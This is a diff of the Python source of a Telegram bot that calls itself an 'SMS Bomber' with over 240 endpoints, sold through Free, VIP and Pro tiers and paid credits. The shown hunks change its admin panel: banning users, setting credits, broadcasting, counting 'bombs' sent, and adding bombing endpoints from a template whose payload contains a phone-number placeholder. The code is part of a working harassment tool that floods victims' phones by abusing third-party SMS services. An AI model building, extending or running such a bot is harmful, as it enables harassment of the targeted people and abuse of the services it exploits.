-    await message.reply_text(msg, reply_markup=keyboard)
-    await state.clear()
-
-@dp.callback_query(F.data.startswith("ban_user_"))
-async def ban_user(callback: CallbackQuery):
-    admin_id = callback.from_user.id
-    if not await AdminPanel.is_admin(admin_id):
-        await callback.answer("❌ شما دسترسی ادمین ندارید!")
-        return
-    
-    target_id = int(callback.data.replace("ban_user_", ""))
-    
-    if target_id in ADMIN_IDS:
-        await callback.answer("❌ نمی‌توانید ادمین را بن کنید!")
-        return
-    
-    await db.ban_user(target_id)
-    await callback.answer("✅ کاربر با موفقیت بن شد!")
-    
-    try:
-        await bot.send_message(target_id, "🚫 **شما توسط ادمین مسدود شدید!**\n\nبرای اطلاعات بیشتر با پشتیبانی تماس بگیرید.")
-    except:
-        pass
-    
-    await admin_view_user_after_action(callback, target_id)
-
-@dp.callback_query(F.data.startswith("unban_user_"))
-async def unban_user(callback: CallbackQuery):
-    admin_id = callback.from_user.id
-    if not await AdminPanel.is_admin(admin_id):
-        await callback.answer("❌ شما دسترسی ادمین ندارید!")
-        return
-    
-    target_id = int(callback.data.replace("unban_user_", ""))
-    
-    await db.unban_user(target_id)
-    await callback.answer("✅ بن کاربر با موفقیت برداشته شد!")
-    
-    try:
-        await bot.send_message(target_id, "✅ **بن شما برداشته شد!**\n\nاکنون می‌توانید مجدداً از ربات استفاده کنید.")
-    except:
-        pass
-    
-    await admin_view_user_after_action(callback, target_id)
-
-async def admin_view_user_after_action(callback: CallbackQuery, target_id: int):
-    user = await db.get_user(target_id)
-    if not user:
-        await callback.message.edit_text("❌ کاربر یافت نشد!")
-        return
-    
-    keyboard = await AdminPanel.build_user_keyboard(target_id)
-    
-    msg = f"""
-👤 **اطلاعات کاربر (به‌روزرسانی شده)**
-
-🆔 شناسه: `{target_id}`
-👤 نام: {user.get('first_name', '')} (@{user.get('username', 'نامشخص')})
-⭐ سطح: {user['tier']}
-💰 اعتبار: {user['credits']}
-📱 معرفی‌ها: {user['referral_count']}
-🚫 وضعیت: {'مسدود' if user.get('is_banned', 0) == 1 else 'فعال'}
-📅 ثبت‌نام: {user['registered_at']}
-    """
-    
-    await callback.message.edit_text(msg, reply_markup=keyboard)
-
-@dp.callback_query(F.data.startswith("set_credits_"))
-async def set_credits_prompt(callback: CallbackQuery, state: FSMContext):
-    admin_id = callback.from_user.id
-    if not await AdminPanel.is_admin(admin_id):
-        await callback.answer("❌ شما دسترسی ادمین ندارید!")
-        return
-    
-    target_id = int(callback.data.replace("set_credits_", ""))
-    await state.update_data(target_user_id=target_id)
+    total = len(db.users)
+    free = sum(1 for u in db.users.values() if u.get('tier') == 'Free')
+    vip = sum(1 for u in db.users.values() if u.get('tier') == 'VIP')
+    pro = sum(1 for u in db.users.values() if u.get('tier') == 'Pro')
     
     await callback.message.edit_text(
-        f"💰 **تنظیم اعتبار کاربر**\n\n🆔 شناسه: `{target_id}`\n\nمقدار اعتبار جدید را وارد کنید:\n(مثبت = افزایش، منفی = کاهش)\nمثال: `50` یا `-10`\n\nبرای لغو /cancel",
+        f"📊 **آمار کلی ربات**\n\n"
+        f"👥 کل کاربران: {total}\n"
+        f"🆓 رایگان: {free}\n"
+        f"⭐ VIP: {vip}\n"
+        f"💎 Pro: {pro}\n"
+        f"📱 کل بمب‌ها: {len(db.bomb_logs)}",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🔙 بازگشت", callback_data=f"admin_view_user_{target_id}")]
+            [InlineKeyboardButton(text="🔙 برگشت", callback_data="admin_panel")]
         ])
     )
-    await state.set_state(AdminState.waiting_for_credits)
-    await callback.answer()
-
-@dp.message(AdminState.waiting_for_credits)
-async def handle_set_credits(message: Message, state: FSMContext):
-    admin_id = message.from_user.id
-    if not await AdminPanel.is_admin(admin_id):
-        await message.reply_text("❌ شما دسترسی ادمین ندارید!")
-        await state.clear()
-        return
-    
-    data = await state.get_data()
-    target_id = data.get('target_user_id')
-    
-    if not target_id:
-        await message.reply_text("❌ خطا! لطفاً دوباره تلاش کنید.")
-        await state.clear()
-        return
-    
-    try:
-        amount = int(message.text.strip())
-    except ValueError:
-        await message.reply_text("❌ مقدار نامعتبر! لطفاً یک عدد وارد کنید.")
-        return
-    
-    user = await db.get_user(target_id)
-    if not user:
-        await message.reply_text("❌ کاربر یافت نشد!")
-        await state.clear()
-        return
-    
-    new_credits = user['credits'] + amount
-    if new_credits < 0:
-        await message.reply_text(f"❌ اعتبار نمی‌تواند منفی باشد!\nاعتبار فعلی: {user['credits']}")
-        return
-    
-    if amount > 0:
-        await db.add_credits(target_id, amount, f"افزایش توسط ادمین {admin_id}")
-    elif amount < 0:
-        for _ in range(abs(amount)):
-            await db.spend_credit(target_id, 1)
-    
-    await message.reply_text(
-        f"✅ **اعتبار با موفقیت تغییر کرد!**\n\n🆔 کاربر: `{target_id}`\n📊 تغییر: {amount:+}\n💰 اعتبار جدید: {new_credits}"
-    )
-    
-    await state.clear()
-
-@dp.callback_query(F.data == "admin_stats")
-async def admin_stats(callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if not await AdminPanel.is_admin(user_id):
-        await callback.answer("❌ شما دسترسی ادمین ندارید!")
-        return
-    
-    stats = await db.get_admin_stats()
-    
-    msg = f"""
-📊 **آمار کلی ربات**
-
-👥 **کاربران:**
-• کل کاربران: {stats['total_users']}
-• 🆓 رایگان (Free): {stats['free_users']}
-• ⭐ ویژه (VIP): {stats['vip_users']}
-• 💎 حرفه‌ای (Pro): {stats['pro_users']}
-• 🚫 مسدود شده: {stats['banned_users']}
-
-💰 **مالی:**
-• کل اعتبار موجود: {stats['total_credits']:,}
-• درخواست‌های پرداخت: {stats['pending_payments']}
-
-📱 **بمب‌ها:**
-• کل ارسال‌ها: {stats['total_bombs']}
-    """
-    
-    keyboard = [
-        [InlineKeyboardButton(text="🔄 بروزرسانی", callback_data="admin_stats")],
-        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_panel")]
-    ]
-    
-    await callback.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
     await callback.answer()
 
 @dp.callback_query(F.data == "admin_broadcast")
-async def admin_broadcast_prompt(callback: CallbackQuery, state: FSMContext):
+async def admin_broadcast(callback: CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
-    if not await AdminPanel.is_admin(user_id):
-        await callback.answer("❌ شما دسترسی ادمین ندارید!")
+    if user_id not in ADMIN_IDS:
+        await callback.answer("❌ شما دسترسی ادمین نداری!")
         return
     
     await callback.message.edit_text(
-        "📢 **ارسال پیام همگانی**\n\nمتن پیام را وارد کنید:\n(می‌توانید از Markdown استفاده کنید)\n\nبرای لغو /cancel",
+        "📢 **ارسال پیام همگانی**\n\n"
+        "متن پیام رو وارد کن:\n"
+        "برای لغو /cancel",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_panel")]
+            [InlineKeyboardButton(text="🔙 برگشت", callback_data="admin_panel")]
         ])
     )
     await state.set_state(AdminState.waiting_for_broadcast)
@@ -1790,259 +921,53 @@ async def admin_broadcast_prompt(callback: CallbackQuery, state: FSMContext):
 
 @dp.message(AdminState.waiting_for_broadcast)
 async def handle_broadcast(message: Message, state: FSMContext):
-    admin_id = message.from_user.id
-    if not await AdminPanel.is_admin(admin_id):
-        await message.reply_text("❌ شما دسترسی ادمین ندارید!")
+    user_id = message.from_user.id
+    if user_id not in ADMIN_IDS:
+        await message.reply_text("❌ شما دسترسی ادمین نداری!")
         await state.clear()
         return
     
-    broadcast_text = message.text
-    users = await db.get_all_users(offset=0, limit=9999)
+    text = message.text
+    sent = 0
+    failed = 0
     
-    if not users:
-        await message.reply_text("❌ هیچ کاربری برای ارسال وجود ندارد!")
-        await state.clear()
-        return
+    status = await message.reply_text(f"📢 در حال ارسال به {len(db.users)} کاربر...")
     
-    sent_count = 0
-    failed_count = 0
-    
-    status_msg = await message.reply_text(f"📢 در حال ارسال پیام به {len(users)} کاربر...")
-    
-    for user in users:
+    for uid in db.users.keys():
         try:
-            await bot.send_message(user['user_id'], f"📢 **پیام همگانی**\n\n{broadcast_text}", parse_mode="HTML")
-            sent_count += 1
+            await message.bot.send_message(uid, f"📢 **پیام همگانی**\n\n{text}")
+            sent += 1
         except:
-            failed_count += 1
+            failed += 1
         await asyncio.sleep(0.05)
     
-    await status_msg.edit_text(
-        f"✅ **پیام همگانی ارسال شد!**\n\n📤 ارسال شده: {sent_count}\n❌ ناموفق: {failed_count}\n📊 کل کاربران: {len(users)}"
+    await status.edit_text(
+        f"✅ **پیام ارسال شد!**\n\n"
+        f"📤 ارسال شده: {sent}\n"
+        f"❌ ناموفق: {failed}"
     )
-    
     await state.clear()
-
-@dp.callback_query(F.data == "admin_endpoints")
-async def admin_endpoints(callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if not await AdminPanel.is_admin(user_id):
-        await callback.answer("❌ شما دسترسی ادمین ندارید!")
-        return
-    
-    total = endpoint_manager.get_endpoints_count()
-    active = endpoint_manager.get_active_count()
-    
-    keyboard = [
-        [InlineKeyboardButton(text="📋 لیست اندپوینت‌ها", callback_data="admin_list_endpoints")],
-        [InlineKeyboardButton(text="➕ اضافه کردن اندپوینت", callback_data="admin_add_endpoint")],
-        [InlineKeyboardButton(text="❌ حذف اندپوینت", callback_data="admin_remove_endpoint")],
-        [InlineKeyboardButton(text="🔄 فعال‌سازی مجدد", callback_data="admin_reactivate_endpoints")],
-        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_panel")]
-    ]
-    
-    await callback.message.edit_text(
-        f"📁 **مدیریت اندپوینت‌ها**\n\n📊 تعداد کل: {total}\n✅ فعال: {active}\n❌ غیرفعال: {total - active}\n\nیک گزینه را انتخاب کنید:",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
-    )
-    await callback.answer()
-
-@dp.callback_query(F.data == "admin_list_endpoints")
-async def admin_list_endpoints(callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if not await AdminPanel.is_admin(user_id):
-        await callback.answer("❌ شما دسترسی ادمین ندارید!")
-        return
-    
-    endpoints = endpoint_manager.get_all_endpoints()
-    
-    if not endpoints:
-        await callback.message.edit_text("📋 هیچ اندپوینتی وجود ندارد!", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_endpoints")]
-        ]))
-        await callback.answer()
-        return
-    
-    msg = "📋 **لیست اندپوینت‌ها:**\n\n"
-    for i, e in enumerate(endpoints[:20]):
-        status = "✅" if e.get('active', True) else "❌"
-        msg += f"{i+1}. {status} **{e.get('name')}**\n"
-        msg += f"   📌 {e.get('url')}\n"
-    
-    if len(endpoints) > 20:
-        msg += f"\nو {len(endpoints) - 20} اندپوینت دیگر..."
-    
-    keyboard = [
-        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_endpoints")]
-    ]
-    
-    await callback.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
-    await callback.answer()
-
-@dp.callback_query(F.data == "admin_add_endpoint")
-async def admin_add_endpoint_prompt(callback: CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    if not await AdminPanel.is_admin(user_id):
-        await callback.answer("❌ شما دسترسی ادمین ندارید!")
-        return
-    
-    await callback.message.edit_text(
-        "➕ **اضافه کردن اندپوینت جدید**\n\nاطلاعات اندپوینت را به فرمت JSON وارد کنید:\n\n```json\n{\n  \"name\": \"نام اندپوینت\",\n  \"url\": \"https://example.com/api\",\n  \"method\": \"POST\",\n  \"headers\": {\"Content-Type\": \"application/json\"},\n  \"payload\": {\"phone\": \"{phone}\"},\n  \"type\": \"json\",\n  \"active\": true\n}\n```\n\nبرای لغو /cancel",
-        parse_mode="Markdown"
-    )
-    await state.set_state(AdminState.waiting_for_endpoint_data)
-    await callback.answer()
-
-@dp.message(AdminState.waiting_for_endpoint_data)
-async def handle_add_endpoint(message: Message, state: FSMContext):
-    admin_id = message.from_user.id
-    if not await AdminPanel.is_admin(admin_id):
-        await message.reply_text("❌ شما دسترسی ادمین ندارید!")
-        await state.clear()
-        return
-    
-    try:
-        endpoint = json.loads(message.text)
-    except json.JSONDecodeError:
-        await message.reply_text("❌ فرمت JSON نامعتبر!\nلطفاً دوباره تلاش کنید یا /cancel را بزنید.")
-        return
-    
-    required_fields = ['name', 'url', 'method', 'payload']
-    for field in required_fields:
-        if field not in endpoint:
-            await message.reply_text(f"❌ فیلد '{field}' الزامی است!")
-            return
-    
-    if endpoint_manager.add_endpoint(endpoint):
-        await message.reply_text(f"✅ اندپوینت **{endpoint['name']}** با موفقیت اضافه شد!")
-    else:
-        await message.reply_text(f"❌ اندپوینت **{endpoint['name']}** قبلاً وجود دارد!")
-    
-    await state.clear()
-
-@dp.callback_query(F.data == "admin_remove_endpoint")
-async def admin_remove_endpoint_prompt(callback: CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    if not await AdminPanel.is_admin(user_id):
-        await callback.answer("❌ شما دسترسی ادمین ندارید!")
-        return
-    
-    endpoints = endpoint_manager.get_all_endpoints()
-    endpoint_list = "\n".join([f"• {e.get('name')}" for e in endpoints[:15]])
-    
-    await callback.message.edit_text(
-        f"❌ **حذف اندپوینت**\n\nنام اندپوینت را وارد کنید:\n\nلیست اندپوینت‌ها:\n{endpoint_list}\n\nبرای لغو /cancel"
-    )
-    await state.set_state(AdminState.waiting_for_endpoint_name)
-    await callback.answer()
-
-@dp.message(AdminState.waiting_for_endpoint_name)
-async def handle_remove_endpoint(message: Message, state: FSMContext):
-    admin_id = message.from_user.id
-    if not await AdminPanel.is_admin(admin_id):
-        await message.reply_text("❌ شما دسترسی ادمین ندارید!")
-        await state.clear()
-        return
-    
-    endpoint_name = message.text.strip()
-    
-    if endpoint_manager.remove_endpoint(endpoint_name):
-        await message.reply_text(f"✅ اندپوینت **{endpoint_name}** با موفقیت حذف شد!")
-    else:
-        await message.reply_text(f"❌ اندپوینت **{endpoint_name}** یافت نشد!")
-    
-    await state.clear()
-
-@dp.callback_query(F.data == "admin_reactivate_endpoints")
-async def admin_reactivate_endpoints(callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if not await AdminPanel.is_admin(user_id):
-        await callback.answer("❌ شما دسترسی ادمین ندارید!")
-        return
-    
-    for e in endpoint_manager.get_all_endpoints():
-        e['active'] = True
-        e.pop('disabled_reason', None)
-        e.pop('disabled_at', None)
-    
-    endpoint_manager.save_endpoints()
-    await callback.answer("✅ همه اندپوینت‌ها فعال شدند!")
-    await admin_endpoints(callback)
-
-# ============================================================
-# Flask Routes (برای Render)
-# ============================================================
-
-@app.route('/')
-def home():
-    return "✅ SMS Bomber Bot is running!"
-
-@app.route('/health')
-def health():
-    return "OK", 200
-
-@app.route('/webhook', methods=['POST'])
-async def webhook():
-    """دریافت درخواست‌های تلگرام از طریق Webhook"""
-    try:
-        update = Update(**request.json)
-        await dp.feed_update(bot, update)
-        return jsonify({"ok": True})
-    except Exception as e:
-        print(f"❌ خطا در Webhook: {e}")
-        return jsonify({"ok": False, "error": str(e)}), 500
-
-# ============================================================
-# تنظیم Webhook
-# ============================================================
-
-async def set_webhook():
-    """تنظیم Webhook برای Render"""
-    webhook_url = os.environ.get("WEBHOOK_URL")
-    if not webhook_url:
-        app_name = os.environ.get("RENDER_SERVICE_NAME", "sms-bomber-bot")
-        webhook_url = f"https://{app_name}.onrender.com/webhook"
-    
-    try:
-        await bot.set_webhook(
-            url=webhook_url,
-            allowed_updates=Update.ALL_TYPES
-        )
-        print(f"✅ Webhook تنظیم شد: {webhook_url}")
-    except Exception as e:
-        print(f"❌ خطا در تنظیم Webhook: {e}")
 
 # ============================================================
 # اجرا
 # ============================================================
 
 async def main():
-    """اجرای اصلی ربات"""
     print("""
 ╔══════════════════════════════════════════════╗
 ║     SMS BOMBER BOT - نسخه کامل              ║
 ║     با سیستم سطوح کاربری + اعتبار          ║
+║     بیش از ۲۴۰ اندپوینت                    ║
 ╚══════════════════════════════════════════════╝
     """)
     print("🚀 ربات در حال راه‌اندازی...")
-    print(f"📊 تعداد اندپوینت‌ها: {endpoint_manager.get_endpoints_count()}")
-    print(f"✅ اندپوینت‌های فعال: {endpoint_manager.get_active_count()}")
+    print(f"📊 تعداد اندپوینت‌ها: {len(SITES)}")
     print(f"👑 ادمین‌ها: {ADMIN_IDS}")
     
-    if os.environ.get("RENDER"):
-        print("🔄 اجرا روی Render با Webhook...")
-        await set_webhook()
-        port = int(os.environ.get("PORT", 8080))
-        app.run(host='0.0.0.0', port=port)
-    else:
-        print("🔄 اجرا روی Local با Polling...")
-        print("✅ ربات آماده اجرا است!")
-        await dp.start_polling(bot)
+    await bot.delete_webhook(drop_pending_updates=True)
+    
+    print("✅ ربات آماده است!")
+    await dp.start_polling(bot)
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("👋 ربات متوقف شد!")
-    except Exception as e:
-        print(f"❌ خطا: {e}")
+    asyncio.run(main())
